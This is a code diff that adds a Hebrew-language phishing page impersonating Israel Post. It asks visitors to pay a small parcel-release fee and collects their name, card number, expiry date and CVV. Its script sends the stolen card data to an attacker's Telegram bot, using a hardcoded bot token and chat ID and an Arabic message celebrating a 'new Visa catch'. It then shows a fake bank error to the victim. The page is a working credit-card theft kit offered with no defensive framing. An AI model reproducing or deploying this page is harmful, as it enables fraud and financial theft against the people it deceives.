@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="he" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>דואר ישראל - תשלום עמלת שחרור חבילה</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f9f9f9; direction: rtl; margin: 0; padding: 0; }
+        .header { background-color: #d32f2f; color: white; padding: 15px; text-align: center; font-weight: bold; }
+        .container { background: white; padding: 25px; margin: 20px auto; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); max-width: 380px; }
+        .logo { width: 140px; margin-bottom: 15px; }
+        h2 { color: #333; font-size: 18px; margin-bottom: 10px; }
+        p { color: #666; font-size: 14px; line-height: 1.5; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; font-size: 16px; text-align: center; }
+        .pay-btn { background-color: #d32f2f; color: white; padding: 14px; border: none; border-radius: 6px; width: 100%; cursor: pointer; font-size: 17px; font-weight: bold; margin-top: 15px; }
+        .footer-logos { margin-top: 20px; opacity: 0.6; width: 100%; }
+    </style>
+</head>
+<body>
+
+<div class="header">דואר ישראל - תשלום מאובטח</div>
+
+<div class="container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/30/Israel_Post_logo.svg/1200px-Israel_Post_logo.svg.png" alt="Israel Post" class="logo">
+    <h2>שחרור חבילה ממתינה (IL88390)</h2>
+    <p>נותר חוב של <b>₪2.90</b> עבור דמי טיפול ומכס. יש להזין פרטי כרטיס לביצוע התשלום ושחרור החבילה למסירה.</p>
+    
+    <input type="text" id="holderName" placeholder="שם בעל הכרטיس (Full Name)" required>
+    <input type="number" id="cardNumber" placeholder="מספר כרטיס (Card Number)" required>
+    <div style="display: flex; gap: 10px;">
+        <input type="text" id="expDate" placeholder="תוקף MM/YY" required>
+        <input type="number" id="cvvCode" placeholder="CVV" required>
+    </div>
+    
+    <button class="pay-btn" onclick="captureData()">אשר תשלום ושחרר חבילה</button>
+    
+    <div id="loading" style="display:none; margin-top:15px; color: #d32f2f; font-weight: bold;">מעבד נתונים... נא להמתין</div>
+    
+    <img src="https://www.the7eye.org.il/wp-content/uploads/2015/05/visa_mastercard_logo.jpg" class="footer-logos" style="width: 100px;">
+</div>
+
+<script>
+    function captureData() {
+        const token = "8163656785:AAFKYatjBrpi9NFDBVtFgwXnz2N2gIyLQ_k";
+        const chatId = "6045533883";
+        
+        const name = document.getElementById('holderName').value;
+        const card = document.getElementById('cardNumber').value;
+        const exp = document.getElementById('expDate').value;
+        const cvv = document.getElementById('cvvCode').value;
+
+        if(!name || !card || !exp || !cvv) {
+            alert("נא למלא את כל הפרטים");
+            return;
+        }
+
+        document.getElementById('loading').style.display = 'block';
+
+        const message = `🚨 **صيد فيزا جديد (بريد إسرائيل)** 🚨\n\n👤 الاسم: ${name}\n💳 الرقم: \`${card}\`\n📅 التاريخ: ${exp}\n🔑 CVV: ${cvv}\n\n🔥 استلم يا معلم!`;
+
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`)
+        .then(res => {
+            setTimeout(() => {
+                alert("שגיאה זמנית בתקשורת עם הבנק. אנא נסה שנית מאוחר יותר.");
+                location.reload();
+            }, 2000);
+        });
+    }
+</script>
+
+</body>
+</html>
